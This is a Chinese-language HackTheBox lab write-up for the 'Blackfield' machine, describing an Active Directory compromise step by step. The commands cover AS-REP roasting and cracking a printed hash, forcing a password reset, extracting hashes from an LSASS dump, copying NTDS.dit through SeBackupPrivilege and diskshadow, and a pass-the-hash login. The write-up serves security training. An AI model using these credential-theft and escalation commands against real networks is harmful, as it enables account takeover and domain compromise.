---
title: "HTB Blackfield"
description: "HackTheBox篇Active Directory 101系列之Blackfield"

date: 2024-07-09T19:30:53+08:00
lastmod: 2025-11-11T09:42:11+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - AS-REP Roasting
  - ForceChangePassword
  - SeBackupPrivilege
---
<!--more-->

> 靶机ip：10.10.10.192

# 知识点

* AS-REP Roasting
* ForceChangePassword权限滥用实现横向移动
* 利用Lsass内存捕获文件提取用户hash
* 利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升
* 使用wmiexec进行PTH

# 信息收集

## nmap扫描

`nmap -sS -sV -sC 10.10.10.192`

![image-20240709112312857](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240709112314494-548401534.png)

有`DNS`服务，`kerberos`服务，`LDAP`服务，`SMB`服务，域名`BLACKFIELD.local`

## SMB

直接尝试一手匿名登录

`smbclient -L \\10.10.10.192`

![image-20240710104224727](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710104225686-281558305.png)

发现得到一些共享资源，尝试获取`profiles$`资源

`smbclient //10.10.10.192/profiles$`

![image-20240710111356614](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710111357853-1171589590.png)

发现一些使用者的名称，将每条带名字的数据保存到`users.txt`中，写个脚本将其保存到`user.txt`中

```python
import re

with open('users.txt', 'r') as file:
    data = file.read()

# 使用正则表达式提取姓名部分
pattern = re.compile(r'^\s*(\S+)', re.MULTILINE)
names = pattern.findall(data)

# 将提取的姓名保存到新文件
with open('user.txt', 'w') as output_file:
    for name in names:
        output_file.write(name + '\n')

print("提取的数据已保存到 'user.txt' 文件中。")
```

这样就获得了一个基本的用户列表

## LDAP

利用`ldapsearch`搜索

`ldapsearch -H ldap://10.10.10.192:389 -x -s base -b "" namingcontexts`

![image-20240710113254757](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710113255598-1728367252.png)

得到两个域名

> `DomainDnsZones.blackfield.local`
>
> `ForestDnsZones.blackfield.local`

# AS-REP Roasting

拿到了用户名，这里又暴露了`kerberos`端口88。尝试一下`AS-REP Roasting`攻击

`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt  -dc-ip 10.10.10.192`

![image-20240710114411468](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710114412279-965573907.png)

拿到一个`support`用户的`hash`

```hash
$krb5asrep$23$support@BLACKFIELD.LOCAL:8e8fcfa24b77dd8ed4e22771a99640c3$937ed6b20ebfcdbc0a07e975d271f8a18d88e0dfc6b774da9184de540c6847c9adeb2b5615a2f99e06235064c420c621ae3b2bc0cf78ebe3047b7004d1dcfac74bc582fc68c3fa0cf0244920cfceab53cee3e91fc049bbef7efa1584041389ae19d317ab6bfb5c0df0eb4703fbe66367f12999d756d9400e971ab0b6d8993c267a606359303d2f4dfc54ae40b819c613e8e6281a91cec5d22aef09304a696cb9b43a4555ce0dbfe860a16bb83ea715eceabee93327ad337799f0f5153e91e924df1624e3458201312cd6a4bc1d4999dd9b0cc2a4ea3406f78836240ef70c1982911fd13e8f45c3c4f36c28781133df608f33d801
```

使用`john`进行破解

将上述票据保存为`hash`，使用`john`爆破`hash`值

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john hash -show`

![image-20240710114626394](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710114627581-651420839.png)

拿到用户名密码：`support : #00^BlackKnight`

但是`evil-winrm`登陆不了，无法通过`BloodHound.exe`进行信息收集，但是可以使用`Python`版的`BloodHound`信息收集，实现了不需要登录即可完成信息收集的功能

# AD域渗透

## Python版Bloodhound-信息搜集

使用之前获得的用户和密码，通过`bloodhound`进行信息搜集

`bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192`

![image-20240710150152607](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710150153628-249598852.png)

![image-20240710150201795](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710150205848-1098348644.png)

得到一些文件，导入`bloodhound`分析

![image-20240710152321163](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710152322259-467189056.png)

点击`First Degree Object Control`可以发现`support`用户与`audit2020`用户有`ForceChangePassword`关系

顾名思义，就是`support`用户可以修改`audit2020`用户的密码

## ForceChangePassword权限滥用实现横向移动

尝试利用`rpcclient`修改`audit2020`用户的密码

`rpcclient -U support --password='#00^BlackKnight' //10.10.10.192`

![image-20240710153321021](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710153321856-686397598.png)

修改密码

`setuserinfo2 audit2020 23 'test'` 

其中`23`表示用户信息级别为设置用户密码的级别

当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码

![image-20240710154019443](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710154020510-5395533.png)

`setuserinfo2 audit2020 23 'abc123!'` 

![image-20240710154642384](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710154643225-1445876917.png)

利用`crackmapexec`验证一下

`crackmapexec smb 10.10.10.192 -u audit2020 -p 'abc123!'`

![image-20240710154815763](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710154816714-1157833350.png)

尝试通过`audit2020`用户去获得更多`smb`共享目录

`smbmap -H 10.10.10.192 -u audit2020 -p 'abc123!'`

![image-20240710155250411](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710155251724-1886584129.png)

发现获得了`forensic`目录的访问权限

`smbclient -U audit2020%'abc123!' //10.10.10.192/forensic`

![image-20240710170745364](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710170746090-1201307298.png)

在`\commands_output\`目录下找到`domain_admins.txt`

![image-20240710170913100](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710170914171-1511595285.png)

将其`get`下来查看

![image-20240710171000020](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710171000940-1172109387.png)

发现疑似`admin`密码

## 利用Lsass内存捕获文件提取用户hash

在`\memory_analysis\`目录下发现 `lsass.zip`

![image-20240710192247820](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710192250343-879219788.png)

该文件可能是对`LSASS`进程进行了内存捕获的结果，`LSASS`是`Windows`中处理身份验证和安全策略的系统服务。其内存空间中保存着各种身份验证的信息。我们将该文件下载并解压。

`smbclient -U audit2020%'abc123!' //10.10.10.192/forensic -t 1000`

![image-20240710203530888](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240710203532417-712881982.png)

![image-20240711113903638](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711113908563-1043657612.png)

得到一个`lsass.DMP`文件

使用`mimikatz`工具从内存转储中尝试提取用户的`hash`，在`Linux`中使用`Python`版的`Mimikatz`——`pypykatz`

`pypykatz lsa minidump lsass.DMP`

![image-20240711140816038](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711140819814-250042491.png)

找到`svc_backup`用户的`hash`：`9658d1d1dcd9250115e2205d9f48400d`

先尝试利用`svc_backup`用户名及其`hash`远程登录

`evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`

![image-20240711143614075](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711143617732-359613996.png)

在`Desktop`找到`user.txt`

![image-20240711145956639](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711150000424-813557009.png)

## 利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升

![image-20240711164407072](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711164410787-733913997.png)

在之前的`bloodhound`信息搜集中搜索`svc_backup`，点击`First Degree Group Memberships`发现该用户属于`backup_operators`组的成员

拥有这个组权限的人可以通过`SEBackupPrivilege `权限进行提权，执行如下命令，确认是否具有该权限：

`whoami /priv`

![image-20240711170123369](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711170127115-1738419937.png)

发现我们有`SeBackupPrivilege `权限，就可以通过使用签名的二进制文件创建 `NTDS.dit` 的卷影副本来完成`diskshadow`

首先上传并导入[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)提供的两个`dll`文件

```sh
upload /root/htb/Machines/Blackfield/SeBackupPrivilegeCmdLets.dll 

upload /root/htb/Machines/Blackfield/SeBackupPrivilegeUtils.dll

Import-Module .\SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
```

![image-20240711202221083](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711202225639-2048106759.png)

接着写入文件并通过`upload`上传

[参考链接](https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm)

但是这里要加一行来指定元数据文件的路径

```diskshadow
set context persistent nowriters#
add volume c: alias new1#
set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分
create#
expose %new1% z:#
```

![image-20240711202615153](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711202619203-1966588599.png)

执行`diskshadow `并使用脚本文件作为其输入

`cmd /c diskshadow /s cmd.txt`

![image-20240711203321708](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711203325908-369933739.png)

将备份`ntds.dit`文件移动到当前文件夹

```powershell
robocopy /b z:\windows\ntds\ .\ NTDS.dit
```

![image-20240711204448694](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711204452433-847416599.png)

![image-20240711204522630](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711204526369-88572884.png)

从注册表中获取`system.hive`文件

`reg save HKLM\SYSTEM .\system.hive`

![image-20240711205050633](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240711205054759-313412363.png)

可以看到，现在已经获得了`NTDS.dit`和`system.hive`，将这两个文件下载到本地

```sh
download ntds.dit
download system.hive
```

使用`secretsdump.py` 解析 `NTDS.dit`

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive local`

![image-20240712141859105](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712141900243-2116055538.png)

拿到`administrator`的`hash`

## 使用wmiexec进行PTH

通过`wmiexec.py`通过`hash`来登录到管理员账户

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192`

![image-20240712142125899](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712142129871-935519493.png)

现在已经是管理员权限了

![image-20240712142625352](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240712142629505-762298768.png)

最后在`Administrator`的`Desktop`上找到`root.txt`以及`notes.txt`

